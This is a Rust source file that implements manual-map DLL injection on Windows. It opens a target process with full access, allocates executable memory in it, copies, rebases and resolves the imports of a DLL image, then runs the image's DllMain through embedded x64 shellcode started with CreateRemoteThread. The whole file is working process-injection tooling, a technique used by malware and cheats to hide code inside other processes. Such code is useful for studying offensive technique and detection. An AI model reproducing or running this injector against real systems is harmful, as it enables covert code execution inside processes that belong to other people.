use std::{ptr::{null_mut}, intrinsics::{copy_nonoverlapping, transmute}, ffi::c_void, io, mem::size_of};
use winapi::{um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_SECTION_HEADER, IMAGE_NT_SIGNATURE, IMAGE_DOS_SIGNATURE, PIMAGE_DOS_HEADER, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_SNAP_BY_ORDINAL64, IMAGE_ORDINAL64, PIMAGE_THUNK_DATA64, IMAGE_IMPORT_DESCRIPTOR}, errhandlingapi::GetLastError, memoryapi::{VirtualAllocEx, WriteProcessMemory}, libloaderapi::{LoadLibraryA, GetProcAddress}, handleapi::CloseHandle}};

/// Manually Maps a DLL in the target process
pub fn manual_map(dll_bytes: Vec<u8>, process_id: u32) {
    let (dos_header, nt_headers) = get_image_nt_and_dos_headers(dll_bytes.as_ptr());
    println!("[+] _IMAGE_DOS_HEADER: {:p} _IMAGE_NT_HEADERS64: {:p}", dos_header, nt_headers);

    let local_image = copy_sections_to_local_process(nt_headers, dll_bytes.as_ptr());
    println!("[+] Local allocated memory region: {:p}", local_image.as_ptr());

    // Get a handle to the target process with all access
    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            process_id
        )
    };

    if process_handle == null_mut() {
        error("Failed to open the target process");
    }

    println!("[+] Process handle: {:?}", process_handle);

    // Allocate memory in the target process for the image
    let remote_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };

    if remote_image == null_mut() {
        error("Failed to allocate memory in the target process for dll");
    }
    
    println!("[+] Remote allocated memory region for the dll: {:p}", remote_image);

    unsafe { rebase_image(nt_headers, local_image.as_ptr(), remote_image) };
    unsafe { resolve_imports(nt_headers, local_image.as_ptr()) };

    // Write the the local image to the target process after rebasing and resolving imports in the local process
    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_image as _,
            local_image.as_ptr() as _,
            local_image.len(),
            null_mut(),
        )
    };

    if wpm_result == 0 {
        error("Failed to write the local image to the target process");
    }

    // Calculate the AddressOfEntryPoint for the PE file
    let entry_point = unsafe { remote_image as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };

    println!("[+] Entry Point: {:#x}", entry_point);

    unsafe { call_dllmain(remote_image as usize, entry_point, process_handle) };

    // Close process handle
    unsafe { CloseHandle(process_handle) };
}

// Allocates memory, inject shellcode in the target process and call DllMain
unsafe fn call_dllmain(image_base: usize, entrypoint: usize, process_handle: *mut c_void) {
    
    #[rustfmt::skip]
    let mut shellcode: Vec<u8> = vec![
        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, image_base  ; hinstDLL
        0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00,                   // mov rdx, 1           ; fdwReason
        0x4d, 0x31, 0xC0,                                           // xor r8, r8           ; lpvReserved
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, entrypoint
        0xFF, 0xD0,                                                 // call rax
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h
        0xC3,                                                       // ret
    ];

    // Insert the image base and entry point as parameters to DllMain
    (shellcode.as_mut_ptr().offset(6) as *mut usize).write_volatile(image_base as usize);
    (shellcode.as_mut_ptr().offset(26) as *mut usize).write_volatile(entrypoint as usize);

    // Allocate memory for the shellcode in the target process
    let shellcode_memory = VirtualAllocEx(
        process_handle,
        null_mut(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if shellcode_memory == null_mut() {
        error("Failed to allocate memory in the target process for the shellcode");
    }
    
    println!("[+] Remote allocated memory region for shellcode: {:p}", shellcode_memory);

    // Write the shellcode that execute Dllmain to the target process
    let wpm_result = WriteProcessMemory(
        process_handle,
        shellcode_memory as _,
        shellcode.as_ptr() as _,
        shellcode.len(),
        null_mut(),
    );

    if wpm_result == 0 {
        error("Failed to write shellcode to the target process");
    }

    // Create remote thread and execute our shellcode
    let thread_handle = CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(std::mem::transmute(shellcode_memory as usize)),
        null_mut(),
        0,
        null_mut(),
    );

    if thread_handle == null_mut() {
        error("Failed to create remote thread");
    }

    // Close thread handle
    CloseHandle(thread_handle);
    //WaitForSingleObject(thread_handle, 0xFFFFFFFF);
}

/// Resolve the image imports
unsafe fn resolve_imports(nt_headers: PIMAGE_NT_HEADERS64, local_image: *const u8) {

    // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
    let mut import_directory = transmute::<_, PIMAGE_IMPORT_DESCRIPTOR>(local_image as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize);

    while (*import_directory).Name != 0 {
        
        // Get the name of the dll in the current _IMAGE_IMPORT_DESCRIPTOR
        let dll_name = (local_image as usize 
            + (*import_directory).Name as usize) as *const i8;
        
        // Load the DLL in the in the address space of the process
        let dll_handle = LoadLibraryA(dll_name);
        
        // Get a pointer to the OriginalFirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
        let mut original_first_thunk = (local_image as usize 
            + *(*import_directory).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA64;

        // Get a pointer to the FirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
        let mut thunk = (local_image as usize 
            + (*import_directory).FirstThunk as usize) 
            as PIMAGE_THUNK_DATA64;
 
        while (*original_first_thunk).u1.Function() != &0 {
            
            // Get a pointer to _IMAGE_IMPORT_BY_NAME
            let thunk_data = (local_image as usize
                + *(*original_first_thunk).u1.AddressOfData() as usize)
                as PIMAGE_IMPORT_BY_NAME;

            // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
            if IMAGE_SNAP_BY_ORDINAL64(*(*original_first_thunk).u1.Ordinal()) {
                //#define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                let fn_ordinal = IMAGE_ORDINAL64(*(*original_first_thunk).u1.Ordinal()) as _;
                *(*thunk).u1.Function_mut() = GetProcAddress(dll_handle, fn_ordinal) as _;
            } else {
                // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
                let fn_name = (*thunk_data).Name.as_ptr();
                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in the IMAGE_THUNK_DATA64
                *(*thunk).u1.Function_mut() = GetProcAddress(dll_handle, fn_name) as _;
            }

            // Increment Thunk and OriginalFirstThunk
            thunk = thunk.offset(1);
            original_first_thunk = original_first_thunk.offset(1);
        }

        // Get a pointer to the next _IMAGE_IMPORT_DESCRIPTOR
        import_directory = (import_directory as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as usize) as _;
    }
}

/// Rebase the image / perform image base relocation
unsafe fn rebase_image(nt_headers: PIMAGE_NT_HEADERS64, local_image: *const u8, remote_image: *mut c_void) {
    
    // Get a pointer to the first _IMAGE_BASE_RELOCATION
    let mut base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(local_image as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize);
    
    // Get the end of _IMAGE_BASE_RELOCATION
    let base_relocation_end = base_relocation as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
    
    // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
    let delta = remote_image as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
    
    while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32 {
        
        // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
        let address = (local_image as usize + (*base_relocation).VirtualAddress as usize) as isize;
        let item = transmute::<usize, *const u16>(base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>());
        let count = ((*base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;

        for i in 0..count {
            // Get the Type and Offset from the Block Size field of the _IMAGE_BASE_RELOCATION block
            let type_field = item.offset(i as isize).read() >> 12;
            let offset = item.offset(i as isize).read() & 0xFFF;

            //#define IMAGE_REL_BASED_DIR64   10
            if type_field == IMAGE_REL_BASED_DIR64 {
                // Add the delta to the value of each address where the relocation needs to be performed
                *((address + offset as isize) as *mut isize) += delta;
            }
        }

        // Get a pointer to the next _IMAGE_BASE_RELOCATION
        base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(base_relocation as usize + (*base_relocation).SizeOfBlock as usize);
    }
}

/// Copy sections of the dll to a memory location in local process (heap)
fn copy_sections_to_local_process(nt_headers: PIMAGE_NT_HEADERS64, dll_bytes: *const u8) -> Vec<u8> {
    // Allocate memory on the heap for the image
    let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize ;
    let mut image = vec![0; image_size];

    // Get a pointer to the _IMAGE_SECTION_HEADER
    let section_header = unsafe { 
        transmute::<usize, PIMAGE_SECTION_HEADER>(&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
    };

    println!("[+] IMAGE_SECTION_HEADER: {:p}", section_header);

    for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
        // Get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = unsafe { &*(section_header.add(i as usize)) };
        
        // Get the pointer to current section header's virtual address
        let destination = unsafe { image.as_mut_ptr().offset(section_header_i.VirtualAddress as isize) };
        // Get a pointer to the current section header's data
        let source = dll_bytes as usize + section_header_i.PointerToRawData as usize;
        // Get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;

        // copy section headers into the local process (allocated memory on the heap)
        unsafe { 
            copy_nonoverlapping(
                source as *const c_void,
                destination as *mut _,
                size,
            )
        };
    }

    image
}

/// Get IMAGE_NT_HEADERS of the provided image
fn get_image_nt_and_dos_headers(image_base: *const u8) -> (PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS64) {
    unsafe {
        let dos_header = transmute::<_, PIMAGE_DOS_HEADER>(image_base);

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            panic!("[-] Failed to get IMAGE_DOS_HEADER");
        }

        let nt_headers = transmute::<usize, PIMAGE_NT_HEADERS64>(
            image_base as usize + (*dos_header).e_lfanew as usize,
        );

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            panic!("[-] Failed to get IMAGE_NT_HEADERS");
        }
        
        (dos_header, nt_headers)
    }
}

/// Panic and print GetLastError
fn error(text: &str){
    panic!("[-] {} {}", text, unsafe { GetLastError()});
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}